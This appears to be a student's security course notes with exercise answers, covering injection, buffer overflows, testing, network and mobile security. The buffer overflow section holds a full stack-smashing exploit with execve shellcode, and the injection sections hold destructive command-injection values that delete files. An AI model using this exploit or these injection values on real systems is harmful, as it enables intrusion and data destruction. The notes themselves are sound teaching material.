   1. software built on top of bigger components (wordpress) and keep those updates coming
   2. CWE: Use of unmaintained third-party components
   3. Reasons why this is not done: code deprecation, dependency management is hard, certification, new stuff can be broken.
   4. Solution: minimize attack surface, track inventory of software and follow upstream security notices, monitor for available patches (if patching is not possible mitigate through firewall or high-level interception)
7. Identification / Authentication failures
   1. CWEs: Improper validation of certificate with host mismatch, Improper authentication, Session fixation
   2. Solution: reduce attack surface through 2FA, Check for good password hygiene, Limit or increasingly delay failed login attempts (and don't create your own policy)
   3. Forcing to change the password (every 6 months) does not protect from phishing because the timeframe is way too big.
8. Software and data integrity failures
   1. E.g. application relies on plugins, libraries or modules from untrusted sources, repositories and content delivery networks (CDNs)
   2. CWEs: Inclusion of functionality from untrusted control sphere, Download code without integrity check
   3. Solution: Mitigate by verifying (through signatures) that data comes from verified source, review code and configuration changes
9. Security and loggin monitoring
   1. Since breaches happen, document ongoing secuirty activities and safely log actions to enable detection and analysis of breaches
   2. CWEs: insufficient logging, imporper output neetralization for logs, etc
   3. Solutions: mitigate by logging failed logins, ensure high value transations have an audit file
10. Server side request forgery
    1. SSRF occurs whenever a web application is fetchin a remote resource without validating the user-supplied URL. It basically get a server to do something it shouldn't do. Also called "Confused deputy attack"
    2. Solutions: prevent by implementing defence in depth

### Arbitrary code execution

It is possible when user-supplied data escapes control

Example contexts: HTML, SQL, LDAP, OS commands, XML, etc

Vulnerability - special characters in user inputs can trigger an action in the context

#### SQL injection

Happens when the SQL characters are escaped.

One of the problems: no input sanitization, so an escape character can be used.

So the attacker controls whatever is inserted between the quotes, and therefore it can escape them and add additional code to execute in the database

LDAP, XSS is same principle

#### LDAP pnjection

Lightweight directory access protocol is used to query directories

It is possible to inject data by changing the meaning of the data by adding conditions by guessing the structure of LDAP query and overcome the password.

Happened for Joomla, and Log4J (library used in a lot of software).

#### Command injection

Since the code uses concatination, more commands can be added with special chars (e.g. "photo & rmdir /s /q photo" when opening the dir)
Similar thing happened to iOS.

#### XSS

Javascript code injection into web pages

Impact: Steal session cookies, Display forged forms, Complete control over webpage.

Mitigation strategy is to replace special chars (e.g. "<,>")

Types:

- Reflected - Attack is sent in the request and reflected in the response
- Stored - attack is stored on the server (e.g. XSS on the forum post)
- DOM-based - attack happens on the client side

#### Protection against injection

Deny by default, otherwise inspect received data twice

When receiving - input validation

e.g.:

```javascript
if (!Regex.IsMatch(txtName.Text,
 @"^[a-zA-Z'.-]{1,40}$")) {
 abort()
}
```

When using - Encode data

- Escape (encode) special characters when you use them
- In SQL: ‘ becomes \’
- In HTML: <,> becomes &lt; &gt;
- In LDAP: (,) becomes \28, \29

SQL injection protection: use prepared statements instead of concatenating. (this is separation of control and data)

### Software security

All software will have bugs. Some of the bugs can be exploitable.

In the stack right next to each other we have data and the pointer which controls the execution of the program. Therefore an attacker can exploit this.

#### Buffer overflows

Vulnerable program: `strcpy` call copies a string into the buffer on the stack, potentially past the end of `cookie`.

```C
int main(int argc, char* argv[]) {
  char authorized = 0;
  char cookie[31];
  if (getenv("AUTH") != NULL && strcmp(getenv("AUTH"), "MAGIC") == 0)
  authorized = 1;
  printf("Give me a cookie ( %p, %p)\n", cookie, getenv("EGG"));
  strcpy(cookie, argv[1]);
  printf("Thanks for the %s\n", cookie);
  if (authorized) {
  printf("Congratulations, you are authorized! \n");
  }
  return 0;
}
```

It is possible to check mitigations with `checksec`

`cookie` is 31 byte buffer, after which there is authorized bool and return address. Strcpy is not checking how much data it is copying (copies everything before '\n')

This means that we can inject code into the address space and set the return address to the address of the injected shellcode.

```C
int shell() {
asm("\
needle: jmp gofar \n\
goback: pop %rdi \n\
 xor %rax, %rax \n\
 movb $0x3b, %al \n\
 xor %rsi, %rsi \n\
 xor %rdx, %rdx \n\
 syscall \n\
gofar: call goback \n\
.string \"/bin/sh\"\n\
");
}
```

`call` puts the return address to the stack and therefore the syscall uses the string argument.

**Exploit**:

```C
#define BUFSIZE 0x20
#define EGGLOC 0x7fffffffefd3
  int main(int argc, char* argv[]) {
  char shellcode[] = "EGG="
  "\xeb\x0e" // jump +0xe (+14)
  "\x5f" // pop %rdi
  "\x48\x31\xc0" // xor %rax, %rax
  "\xb0\x3b" // mov $0x3b, %al
  "\x48\x31\xf6" // xor %rsi, %rsi
  "\x48\x31\xd2" // xor %rdx, %rdx
  "\x0f\x05" // syscall
  "\xe8\xed\xff\xff\xff\x2f " // call 0xed (-19)
  "\x62\x69\x6e\x2f\x73\x68\x00\x5d "; // /bin/bash+\0
  char buf[256]; // buffer used for overflow
  for (int i = 0; i <BUFSIZE+sizeof(void*); buf[i++] = 'A'); // fill buffer + rbp
  char **buff = (char**)(&buf[BUFSIZE+sizeof(void*)]); // overwrite RIP
  *(buff++) = ( void*)EGGLOC;
  *buff = ( void*)0x0;
  char *args[3] = { "./stack", buf, NULL }; // execution environment
  char *envp[2] = { shellcode, NULL};
  execve("./stack", args, envp); // fire exploit!
  return 0;
}
```

#### Mitigations

This program violates:

- memory safety: stop memory corruption - safe C/C++ dialects (CCured, Cyclone), rewrite in safe lang
- Integrity: Enforce integrity of reads/writes
- Randomization: Randomize locations, code, data, or pointer values
- Flow integrity: Protect control transfers - data-flow integrity, control-flow integrity

#### Defense strategies

**Data execution prevention (DEP)** - distinguish code and data and prohibit the attacker from ijecting code.
Problem - ISAs (e.g. x86, ARM) did not distinguish code and data

DEP hardware support - page table extension, introduce NX-bt (No eXecute bit).
Intel - per-page bit XD
AMD - Enhanced Virus Protetion
ARM - XN
thsis is an addtional bit for every mapped virtual page.

Attacker can still control pointers.

**ASLR - Address Space Layout Randomization**
ASLR focuses on blocks of memory (i.e., it is coarse grained)
Heap, stack, code, executable, mmap regions end up at random addresses
ASLR is inherently page-based, limiting cost of shuffling
Initialized when process starts (never re-randomized)

**Stack canaries (stack protector)**
Before we return from the function we check if the canary is still alive. This canary is placed before the return value in the function which is a magic value.
This allows us to protect RIP control-flow attacks.
Key limitation - only protects from continuous overwrites if (and only if) the attacker does not know the canary
Low overhead.

## Exercises 6

**Exercise 6.1**
You are writing a web application to sell Whisky. You want to save your customers’ names in a database. You know that single quotes (’) can break SQL request.
What can you do to be able to accept single quotes in names and still have no problem with SQL injections?

You can always encode the data, so that special characters lose their special meaning. In SQL a literal single quote (’) can be encoded by prepending a backslash (\’).

**Exercise 6.2**
Consider the following code, taken from the Mitre Common Weakness Enumeration website ([https://cwe.mitre.org]). A web application has a function to run a backup of a database. The backup can be of type full or incremental. The type of backup is selected by the user and is sent to the server in the parameter named backuptype. The following code is used on the server:

```java
...
String btype = request.getParameter("backuptype");
String cmd = new String("cmd.exe /K \"
c:\\util\\rmanDB.bat\"
+ btype +
\"&& c:\\util\\cleanup.bat\"")
System.Runtime.getRuntime().exec(cmd);
```

Name the type of attack that could happen here and explain its possible consequences.

This code is vulnerable to command injections. By inserting the correct characters into the
backuptype and attacker can execute any command on the server, for example deleting all the
files.
In our case the program runs the Windows command interpreter cmd. CMD accepts multiple
commands if they are separated by & or &&. Thus, the following value for backuptype would delete
all files in the current directory: & del \*.\* .

**Exercise 6.3**
Memory pages can be protected against writing or execution.
Explain why it is dangerous to have pages where both execution and writing are permitted.

If a page is both writable and executable, an attacker could store data that corresponds to instructions (a shellcode) and then manipulate the instruction pointer to have this code executed.

Writable memory pages are used to store data received by the program. Executable pages contain instructions of the program.

As there is often no need to modify the instructions of a program that is executed, executable pages are set to read-only and writeable pages to non-executable. This prevents the execution of shellcode, without interfering with the correct execution of the program.

**Exercise 6.4**
At the end of a function call, two addresses are often popped from the stack.
What are those two addresses used for ?

One address is the base pointer of the function to which we are returning. The base pointer points the start of the memory region where the local variables of a function are stored.

(As the current function is about to end, its local variables will not be needed anymore. However, the function we are returning to will need to access its local variables. This is why we restore the value of the base pointer to the value we stored on the stack before we started the function.)

The second address that is popped from the stack is the return address which indicates at which address in the code the execution has to continue after the end of the function.

**Exercise 6.5**
Local variables are on the top of the stack and the return address at the bottom.
How can a buffer overflow overwrite the return address that is below the variable on the stack?

The stack actually grows from the top of the memory to the bottom of the memory. Thus, the address of the bottom of the stack is higher than the addresses at the top of the stack. When we overflow a buffer, we write to addresses that get higher and higher and thus reach the bottom of the stack.

**Exercise 6.6**
Why must a stack canary have a random value ?

The stack canary is used to detect if the saved base pointer and the return address have been overwritten by an overflow. If an attacker could know the value of the canary, they could overwrite it with the same value and the overflow would not be detected.

**Exercise 6.7**
Imagine a program where the name and the price of a product are stored in memory just above a variable containing the shipping address of the product.
Be entering an extra long shipping address, the customers are able to modify the price of the
product and buy it for cheaper.
For each of the following protection methods, explain if it could prevent this attack:
• address space layout randomization (ASLR)
• marking the memory page as non executable or non writeable
• using a stack canary

ASLR will place the memory page of the variables at a random location. They will still be adjacent and it will not prevent the attack.

The program will not work if the memory page is not writeable, The attack does not write any code into the memory. Marking the page non-executable will not prevent the attack.

Finally, if the shipping address does not overflow more than the memory used for the price, it will not affect any canaries. Thus, non of these methods can prevent the attack.

## Automated Testing

#### Why testing

Testing is the process of analuzing a program to find errors.

To completely make it automated we need formal specification, but it's impossible to define these things completely.

Error could be a violation of the underlying specification: functional requirements, operational requirements, and security requirements - we can try to have automated attacks or previous attacks (but if they don't succeed, we still don't know if it is secure), so we should try all possible input combinations (there are limitations such as for all characters up to length of n)

#### Limitations of testing

Testing can only show the presence of bugs, never their absence

Bugs are everythere:
There are giant code bases (chromium, linux kernel, gnome, etc.), millions of LoC => huge attack surface, milions of vulnerable hosts -> weaponizable
Dependency inflation - recursive dependancies, single point-of-failure (e.g. log4j), redundant code, even bigger attack surface.
System abstraction - developers unaware of underlying assumptions, ChatGPT-generated code
Integration hell - 2 "bug-free" systems can still interact in a faulty manner

#### Software testing and verification

Manual testing:
Code reviews
Unit and regressions tests (JUnit, libcheck) are incomplete but sound, only code with tests is tested but any failed tests indicate an actual issue

Semi-automated testing:
Annotation (pre and post conditions) and proof enginers (F\* lang)
Type checking and dependent types (Coq, F\*)
Code byg pattern search (CodeQL) are as complete as annotations and sound (modulo mistakes)

Automated testing:
Static analysis (Facebook Infer, compiler checks) is incomplete and unsound due to lack of runtime information but remains an indicator of possible issues
Dynamic analysis (fuzzing, symbolic execution) is incomplete but sound due to state explosion but any reported issues are true bugs

### Manual testing

#### Code reviews

Formalized process of someone else looking at your code. Finding flaws and code smells.

_Flaws_ - any violationsof the specification or bug.
_Code smells_ - not per-se an issue but could become one (target to improve)

Goals - improve code quality, find flaws, learning/knowledge transfer, foster ideas/alternate solutions, compliance to standards

Code reviews can never find all flaws, but offer different thoroughness

Most bugs are in most recent code.

Types:

- Inspection - group of reviewers goes through all code line-by-line to find flaws and to document any unexpected behavior. Does not scale well, and requires a lot of resources.
- Walk-through - go through the finite set of changes - during a pull-request.
- Audit - (external) group of reviewers spot-checks the code to find dlaws, often searching for patterns to find flaws/violations (does not look for specific flaws, but general quality of the code)

#### Unit and regression tests

**Unit** - small and individual tests for a fragment of code
Developers should write these tests during the development alongside the code itself. _Positive_ tests - ensure correctly processes input, _negative_ tests - fails correctly.

**Regression** - bug that was fixed some time ago, and due to code changes a bug reemerges. Unit tests help detect them after the changes.

### Semi-automated testing

#### Static analysis

Syntax highlighting, compile-time warnings - goal is to highlight issues in code, give feedvack to developer.
Should be fast (low overhead, simple analysis), myst have low false positives (warning fatigue - psychological constant where you start ignoring the question and using a default answer).

```bash
clang -Wall -Wextra -Wpedantic
```

`Wall` - enables basic set of warnings, mostly easy to fix; `Wextra` - exteends Wall, being a little more detailed (examples are empty function bodies, unused parameters or sign mismatches); `Wpedantic` - warns about anything that goes beyond strict C/C++, highlights areas of bad code style as well; `Weverything` - turn on every single warning that exists - creates noise

> Static analysis reasons about code instead of executing it.
> (Dynamic is a little bit different - it keeps track of concrete values during execution)

Advantages:

- Full coverage (no need for complete tests cases)
- Complete (test cases may miss edge cases)
- Abstract interpretation (no need for a runtime environment)

Disadvantages:

- Computation depends on data, resulting in undecidability
- Over-approximation due to imprecision and aliasing leading to false positives

#### Anotations

Augment source code but are not part of the functional code itself

Compilers may use annotations to test or check certain properties:
Types in python, argument usage in C/C++, pre/postconditions for verfication

#### CodeQL - static analysis framework to find bugs

Pattern-based code analysis engine to automate security checks.
Target code is parsed and analyzed based on patterns in the query language, starting from sources the patterns search for a path towards a sink.

Discovered paths indicate security vulnerabilities.

Same as fofther static analyses, may result in false positives.

Quality of the reported bugs depends on the quality of the queries (heuristics).

#### The 8 "Laws" of static analysis

- Can’t check code you don’t see: must fit into build system
- Can’t check code you can’t parse: must parse “real” code
- Not everything is implemented in C: must handle other languages
- Not a bug: developers will not fix any report
- Not all bugs matter: developers must prioritize
- False positives matter: reduce developer burden
- False negatives matter: reduce developer burden
- Annotations are extremely costly: reduce developer burden

### Automated testing

#### Formal verification - model checking/symbolic execution

Formal verification is the act of proving or disproving the correctness of the code.

Model checking - translate code into state machine, model checker analyzes state machine
Symbolic execution - engine analyzes program by exploring paths

##### (bounde) model checking

Analyst translates the code and specification into a finite state machine.

While this allows end-to-end verification it is highly labor intesive. Bounded model checking slices the program and checks the slices instead to scale a bit further.
6000 lines program took 20+ years to verify.

A bug was found in Formally Verified OS, how? - fault in state machine

##### Symbolic execution

SE is an abstract interpretation of code.
Agnostic to concrete values (values become formulas)

#### Fuzzing

Automatic and dynamic software testing technique
Key concept - fastest way to test a program is to run it

Running the program many times, keeping the best inputs and retry.

Obstacles (that hinder by control-flow and data-flow restrictions):

- magic byte matching for the parsing
- checksums
- compression/encryption - e.g. crypto
- dependencies
- indirection

Overcoming these obstacles is the subject of many research efforts.

A fuzzer should explore the program - a bug cannot be found if its code is not executed

A fuzzer should trigger bugs - executing buggy code does not necessarily mean a bug has been triggered

A fuzzer should identify faults - a triggered fault that goes unidentified is wasted effort

A fuzzer should be fast - speed is key to a fuzzer's efficiency, higher throughput = more inputs tested = higher chance of triggering a bug if it exists.

Fuzzing executes 1000s of trials per second.

##### Blackbox fuzzing

create input, run program, see if it crashes

give the input to the developer to reproduce the bug.

This is not very clever, because the input is random and limited at the depth level.

##### Greybox fuzzing

Guided mutation - assign a quality to each input.

Quality e.g. which part of the code has been covered? Covers more distinct code areas.

This remains fast and it sacrifices only few CPU cycles for performance benefits.

##### Input Generation

Not all input are made equal
Mutation-based generation

- no specification needed
- inputs are seen as binary blobs
- mutators transform input (bit flips, int ops, clone, delete)
- fast portable and scalable

Grammar-based generation:

- specification is needed for input structure (e.g. PNG files)
- unputs are seen as parametric data
- parameters are sampled, constraints are resolved to generate grammatically-valid inputs
- may be slow, application-specific

#### Sanitization - fault detection

Makes bugs more explicit.

Ideal sanitizer - detect bugs as soon as they occur.
First approximation - CPU exceptions (segfault, timeouts, div by 0, int overflows)

LLVM sanitizers by policy:

- spatial and temporal memory safety
  - address sanitizer
  - memory sanitizer (uninitialized variables)
- Language-specific behavior
  - undefined behavior sanitizer (arithmetic overflows, div by 0, misaligned pointers, int sign mismatch)
- Concurrency and ownership
  - thread sanitizer (Data races)

LLVM sanitizer can be applied to source code, at compile time.

Operates as a priori instrumentation, but there are ones without that - Valgrind memcheck, QASan (QEMU- ased ASan), RetroWrite -- they all have overhead.

We need model/abstraction/policy for expected behavior.
How to model logic or semantic bugs? need specification

#### Identifying faults

Crashes are good indication but not all faults crash.
Sanitizers implement fault detection by enforcing bounds.

### Comparison of Analyses

**Formal verification**: 100s lines of code, finds all bugs
**Bounded model checking**: 1,000s lines of code, finds most bugs (scales formal verification by constraining loop bounds)
**Symbolic execution**: 10,000s lines of code, finds all bugs (but may run into state explosion)
**Concolic execution**: 50,000s lines of code, finds bugs close to provided concrete execution (focuses on single path to limit state explosion)
**Fuzzing**: 1,000,000s lines of code, finds many bugs
**Warnings/simple analyzers**: 100,000,000s lines of code, finds lots of interesting
locations

## Exercises 7

**Exercise 7.1**
What is coverage-guided fuzzing, and how does it differ from black-box fuzzing?

Coverage-guided fuzzing is a form of greybox fuzzing where the feedback metric is coverage profiles. The fuzzer implements a search algorithm to maximize the objective function which is code coverage. The fuzzer then leverages this feedback to select interesting inputs and mutate them, in an attempt to create even more interesting inputs. This differs from blackbox fuzzing in that the latter does not incorporate any feedback into the fuzzing process; inputs are sampled randomly with static probabilities that are not affected by the behavior of the program.

**Exercise 7.2**
Given the following program, how likely is it for a blackbox, greybox, or whitebox fuzzer to find the correct value for `user_input`?

```C
int foo ( uint32_t user_input ) {
  /∗...∗/
  if (user_input == CONSTANT) {
    /∗...∗/
    crash();
    /∗...∗/
  }
  /∗...∗/
  return 0;
}
```

Assuming a blackbox fuzzer, the likelihood of randomly generating a 32-bit integer to match a specific value is 1 in 2 32. A more advanced fuzzer that leverages feedback could observe that such a comparison is made and then reinsert the constant into the input in the next iteration, increasing the likelihood to 1 in 2. A whitebox fuzzer knows of this condition beforehand (e.g. through symbolic execution) and can generate a valid input in a single attempt.

**Exercise 7.3**
What is a sanitizer and why is it helpful in fuzzing? Why can certain bugs only be detected when using sanitizers?

A sanitizer is a fault detector and reporter. It implements a security policy and enforces it by inserting runtime checks and raising a red flag when the policy is violated. They increase the likelihood that a bug is detected, which is a requirement for successful fuzzing. A fuzzer can only report/save a bug-triggering input if it is informed of the fault that happened, and sanitizers are a great way to do that. The most basic form of fault detection is through crashes: a bug corrupts memory and results in an invalid memory access, which the CPU detects and raises an exception for. However, not all memory corruptions crash, and not all bugs corrupt memory, so many of them remain undetected, unless a sanitizer which implements a policy that detects them is employed.

## Network security

### Best practices

**Inside** the network: segment the network physically:
Different zone for different parts of the organization
Demilitarized Zone (DMZ)\* to expose organization's external facing networks to the Internet - server that belongs to the organization but serve towards the outside.

Towards the **outside** the network: secure communication - TLS, IPSec, VPNs

### Network segmentation

Break the network down into segments based on system and data classification.

Access from zone to zone can be managed by ACLs (access control lists) in routers or firewalls. Users belong to individual areas.
May want to have central authentification service

Mainly addresses two points:

- prevents all-at-once compromise of facilities
- protects the data center from external threats

#### Rings

Concentric architecture where the most privileged services are inside, and therefore if you can access the center you access everything around it.

#### Zones

Creating containment zones aims to stops attacks from spreading between zones.
Communication between zones goes through backbone which is connected to zones by firewalls.
Closer to least privilege than rings.
The challenge is to create firewall rules for each case - easy to make mistakes.

#### Demilitarized Zone (DMZ)

Physical or logical subnetwork which contains and exposes the organizations's external-facing services
And external network node can access only what is exposed in the DMZ
The most common services is email, VPN endpoint

Two common architectures:

- firewall redirects teither to corporate network or DMZ
- firewall -> DMZ -> internal firewall

Firewall - has routing rules and decided the packet route based on different kinds of information. Can be statefull or stateless

#### Virtual segmentation

_VLANs_ - technologoy implements additional security services at layer 2 network (ethernet). Makes the virtual cables and switches that are accessible by specific accesses, even though the network goes through the the same cables and switches.

_Virtual Routing and Forwarding_ - allows a single router to be part of several IP networks with VLAN and VRF, any socket in any location can be configured to belong to any ethernet network and IP network.

_Virtual Machines_ - allows coalescing several servers and routers on a single hardware rack. The web server in the DMZ may actually be running on the same physical machine as the database of the internal back-end zone.

It would be implemented at switches and routers level.

#### "Zero trust" networks

Idea - do not trust anybody, not even internal machines.
Prevent lateral movement

Assume that any device can be compromised. So need to continuously monitor and validate everything.
Install local firewall on internal machines (LPOP, access control)
Encrypt all traffic between internal machines
Use strong authentication even internally (MFA)

More work to configure machines but with modern techniques (dockers, kubernetes) configuring and rolling out virtual machines can be automated.
Less work on configuring the network
Greatly reduces the impact if one machine is compromised.

### Protecting remote access - Virtual Private Networks

#### VPN

VPN runs a private network over a public network using two components:

- encryption to keep it private and for confidentiality (cannot hide the metadata)
- encapsulation packing IP packets inside IP packets to hide internal addresses and to transport private packets over the public network

A distant network or single machines can access a VPN thorugh a VPN gateway
A single machine can run a VPN software to create a virtual interface, where it looks like the data coming from the network card is being tunneled through the internet
Before being sent, packet is encrypted and encapsulated with IP header with the public addresses.

**Typical protocols**

- IPsec, official IETF standard
- OpenVPN, open source software, based on TLS
- WireGuard, built into the Linux kernel
- Proprietary protocols (e.g., Cisco AnyConnect, Microsoft SSTP) offer convenience in configuration and maintenance

**Typical use**

- Letting remote workers access the internal company network
- Interconnecting remote sites of a company
- For us: Accessing university resources (e.g., to download papers)
- For us: Playing CTF and bridging networks between teams

**VPN for privacy** - VPN to another country and access Internet from there
The address is hidden by the one of the VPN gateway.

Danger - the VPN provider sees your traffic

### Protecting the perimeter

#### Firewalls

Firewall enforce network level access control and limit what kind of data is being passed through.

Typically border between Internet and internal network.

Firewalls operate at the netowrk layer by analyzing metadata such as apacket headers of IP, TCP, UDP. Are oblivious of the application for which the packets are transmitted.

Within the network:
idea is to segement the network to limit lateral movement of attackers.

EPFL example:
most machines are in the generic EPFL zone
All muachines accessible from Internet are in untrust zone
Machine in uncrust cannot connect to machines in EPFL, but opposite is OK
Secret data in in Data Center zone, behind a firewall.
Zones can connect to other zones of lesser security, like MAC.

**Best practices** - allowlist

Explicitly allow certain connections and deny the rest.

Examples - allow only HTTP and HTTPS from internal zone to Internet, allow SSH from Internet only to one server.

Principle of **default deny** - the last rule denies all traffic that has not explicitly been allowed before.

Default allow is a problem because something will be missed.

> Exclusively work at metadata level

#### Proxies

**Operates at the application level**

Proxy acts as a server to the client and a client to the server - like a MITM

Proxy: client - proxy - internet - server
Reverse proxy: client - internet - reverse proxy - server

Direct proxies protect users when they access servers on the Internet
Reverse proxies protect servers when accessed by users from the Internet

##### Web proxies

Goal - protect users surfing the web against threats by reducing attack surface

Analuze all data downloaded from the web
Block access to dangerous sites

The browser must be configured to use the proxy
The firewall can be configured to only allow the proxy access web sites, users cannot surf the net if they don't go throug the proxy.

Problem: Proxy needs access to the cleartext, which means they cannot work by default for TLS.
Solution - the proxy can be configured to intercept HTTPS traffic. Rather than forwarding the handshake it pretends to be the server. (generates fake certificates like company ones - therefore all browsers would need to be configured to accept that cert)
Solution - passthrough but then proxy does not see the data

##### Mail gateways

Mail gateways act both as proxy and reverse proxy: all outgoing mail is stored on the mail gateway before being forwarded to the internet

All incoming mail is intercepted by the gateway before being forwarded to the users' mailbox

Mail gateways typically offer antivirus protection, incoming and outgoing spam protection

##### Web Application Firewall (WAF)

WAF is a typicall example of a reverse proxy with the goal of protectin a web server against maliciour requests
It analyses requests, and if it deems safe, forwards them to the real server

WAFs typically offer:

- block any request that seems to contain an attack (XSS, SQL injection)
- limit the number of requests to protect against DoS attacks
- block an IP address for certain time after attack detected
- authenticate users (CAPTCHA)

Example - modSecurity
Checks for XSS, or SQL injections.

Analyzes the HTTP traffic

##### Intrusion detection systems

IDS inspects traffic for all applications to detect potential intrustions
Generates alerts if it thinks it saw an attack and then terminates the connection

Two technologies:
Signature-based systems - false positives
Anomaly-based systems - false negatives

**Signature-based IDS**:
compares network traffic against signatures from a pattern database

Issues:

- requires previous knowledge of an attack to create a signature (false negatives for new attacks)
- matched signature does not always mean successful attack (E.g. signature for linux vulnerability in traffic of a windows server - false positives)

Signature examples:

- High number of failed login attempts
- URLs with extra long parameters (buffer overflow?)
- Exploiting a specific vulnerability: Cisco IOS invalid IKE fragment length memory corruption or exhaustion attempt

Example - Sort - sniffs traffic in front of your firewall to detect potential attacks.
Sends alarms and/or updates to frewall, blocking the attacker. Large db of free rules maintained by community.

**Anomaly-based IDS**
Goal - detect unknown attacks

IDS creates a traffic profile during normal operation to calibrate.

During monitoring, it looks for unusual packes, e.g. growth in port scans

- might not detect an SQL injection (extra characters in username)
- might notice a 200MB transwer of password hases from the db

Generates a lot of false positives and negatives (anomaly != attack)
(very hot application for machine learning)

Pr(MarkedAsMalware|IsMalware) = TPR = 0.99
Pr(IsMalware) = 0.0001
Pr(MarkedAsMalware) = 0.01
Pr(IsMalware|MarkedAsMalware) = Pr(MarkedAsMalware|IsMalware)\*Pr(IsMalware)/Pr(MarkedAsMalware) = 0.99\*0.0001/0.01 = 0.0099

### Protecting the workstation

Prevent exploitable bugs:
ensure automatic update of the OS, ensure automatic update of the applications

Prevent known malware:
install antivirus or use built-in ones, install applications from trusted sources

Antivirus usefullness has gone down - malware campaing used to be live 2-3 weeks, and now it is 2-3 hours because they assume they will be signatured and put to the database.

Prevent unknown malware:
prohibit users from installing applications, restrict write access to dirs that contain documents, not programs

#### Preventing the privilege escalation

Verify that all access rights are correctly set on programs and libraries

Typical issue - a program that is run by System is writable by any user, the attacker replaces the program by a malicious program and reboots the machine

Make sure that all programs are regularly patched to fix any known vulnerabilities
Make sure that the hard disk is encrypted, if not, attackers can boot from USB (or remove disk) and have full access rights to all files.

#### Protecting History - logging

keeping audit trails (logs) is an important part of network security to:

- identify security incidents
- monitor policy violations
- non repudiation control

Typical sources of logs:

- firewalls, proxies and IDS
- client and Server machines
- mail servers
- database applications

##### Things you should never log

- **passwords**
- religious, ideological, political or trade union-related views or activities
- health, the intimate sphere or the racial origin
- social security measures
- administrative or criminal proceedings and sanctions

Internet access logs should only be logged anonymously, nominal analysis of Internet access is only allowed if there are tangible signs of abuse

Mailboxes and logs should be protected against unauthorized access.

#### Protecting History - backups

3-2-1 rule:

- 3 copies of the data
- on 2 different types of media
- 1 stored off-site

**Backup types** - full, incremental (data that changed since last backup), differential (data that changes since last full backup)

**Backup content**: different depending on the ype of data:

- backup of (virtual) machines: allow to restore a machine without having to re-install and configure all the software
- backup of db: databases have their own tools to backup and restore the content of their tables
- file storage: data storage servers can archive every version of every file up to the last backup (e.g. one day) so that no data is lost if files are accidentally deleted during the day

**Disasted recovery plan**:
making backups is not sufficient
Backups also need to be tested regularly through _restoration tests_, i.e., to ensure we can recover data from backups

A Disaster Recovery Plan (DRP) records, in detail, how to rebuild a system in case of a major failure.

## Exercises 8

**Exercise 8.1**
Consider the following two options for letting remote users access your company’s e-mail:
• They use a VPN access to the company’s network. Then, they can use their preferred mail
client to access the mail server of the company.
• You install a web server with a web-mail program (like ewa.epfl.ch) such that the users can
access their e-mail with any web browser.
Which of the two options is more secure? Why?

Typically, a VPN connection gives access to all of the internal network for any type of traffic. Thus, if the user’s machine was infected by a malware or under control of a hacker, the attack could propagate to all of the internal network. The web-mail program only gives access to e-mail. In case of an attack, only the e-mail would be compromised. This is a typical application of the principle of least privilege.

**Exercise 8.2**
Which option is safer:
• Specifying what is forbidden (black list) and allowing the rest.
• Specifying what is allowed (white list) and denying the rest.
Explain why.

Using a white list is safer. Indeed, if you forget to put something on the list you do not create a security risk. This is called the principle of default deny.

**Exercise 8.3**
• Describe the difference between a (direct) proxy and a reverse proxy.
• Describe one security related function that each proxy can provide.

A direct proxy is located close to the client. It receives all the connections of the client for a given application (e.g. HTTP) and forwards them to the corresponding server on the internet.

A reverse proxy is located close to the server. It receives the connections of all clients and forwards them to a server.

A direct proxy can be used to block access to known dangerous websites (e.g. phishing campaigns). It can also scan for malware in the documents downloaded from the Internet.

A reverse proxy can detect and block web based attacks against a web server (e.g. SQL injections).

**Exercise 8.4**
The web proxy of your company keeps a log of all connections that are made to all websites.
• Describe a situation where these logs can be used to help secure the company’s network.
• Describe a situation where these logs could be a problem for the company’s security.

If one workstation of the company was infected by a malware downloaded from the Internet, the logs could help the company find out which other workstations also downloaded the same malware.

If the logs contain passwords or access tokens used to access protected information, an attacker who gains access to the logs would be able to access the protected information. The company could be breaking the law if the logs contain sensitive personal information that can be linked to employees (e.g. which employee accessed which political website). Such logs should only exist if there is a valid reason and they should be protected in order to prevent abuse.

**Exercise 6.5**
• Describe the DRP plan that will make possible to start over after your data center has burned
down

A typical DRP could contain the following steps:

- Buy new machines.
- Play back the full images of all servers to get the machines working with all applications as installed before the fire.
- Use the database backups to populate the databases with the data they contained before the disaster.
- Restore the files of all the users.
- Write a report of which parts of the recovery worked and which didn’t. Adapt you backup strategy accordingly

## Mobile security

### Mobile security motivation

Phone on 100% CPU capacity will be on for 10min.
So everything needs to be throttled.

A lot of sensors that are carrying personal data.

More exposed to local attackers (e.g. phone left at the bar)

Mobile computing is considered as one of the computing revolutions

### Attack vectors

#### Types of malware: repackagring / look-alike Malware

Download app from app market.
Unpack and reverse endgineer app (relatively easy on Android)

Modify and add code:
add ads, require more permissions than original app to steal user data, escalate privileges using exploits to deploy ransomware ...

Pack and publish modified version.

This is not a targetted attack, just broad attack.

#### Privacy of digital content

Steal digital content from content providers.
Platform needs to support for secure audio and video playback, and premium content must not leave the device.

Streaming services usually require platform with digital rights management (DRM, e.g. Google Widevine or Microsoft PlayReady) to stream premium content.

Why do we need DRMs on the system itself?

- the system is not trusted
- to put watermarks on the stream (e.g. netflix id), since on the server it would be very expensive on the server.

#### Broader - Political instrument

there are companies that provide access to people's phone's

Usually these services, e.g. NSO, are sold to the CIAs, FBIs, other agencies that, e.g. kill journalists

### Android vs iOS

The biggest difference - **openness**.

#### Apple's iOS ecosystem is **extremely closed**

- iOS is a closed source
- iOS and iOS apps can only run on Apple devices
- you can install apps only from Apple Store (potential change due to EU)
- Tricky to "jailbreak" iOS devices

How come they still are aroud?:
they were first, and they make great prodcuts and people know about it

#### Google's strategy

Even though they started earlier, they were late to market it.

Ecosystem is much more open:

- Android/AOSP is open source
- Android can run on many different devices, even non-Google ones
- easy to inspect Android apps/reverse/modify
- Easy to install apps you develop ("side loading")
- developers can do many more things
- quite easy to "jailbreak" Android devices

Android is likely more secure as long as you keep updating security

### ARM - ARMv8

#### ARM processor profiles

Cortex-A - full application (offers more features)
Cortex-R - real-time (industrial control, and tight scheduling bounds)
Cortex-M - embedded (small embedded chips, most IoT runs on this)

#### ARM ARMv8 privilege levels

|     | Normal world (Rich Execution Env) | Secure World (Trusted Execution Env) |
| --- | --------------------------------- | ------------------------------------ |
| EL0 | Applications                      | Trusted applications                 |
| EL1 | Rich OS                           | Trusted OS                           |
| EL2 | Hypervisor                        |                                      |
| EL3 | Secure Monitor                    | Secure Monitor                       |

x86:
ring -2 - Firmware manager
ring -1 - Hypervisor
ring 0 - OS
ring 1 - nothing (intended for drivers but they run at ring 0)
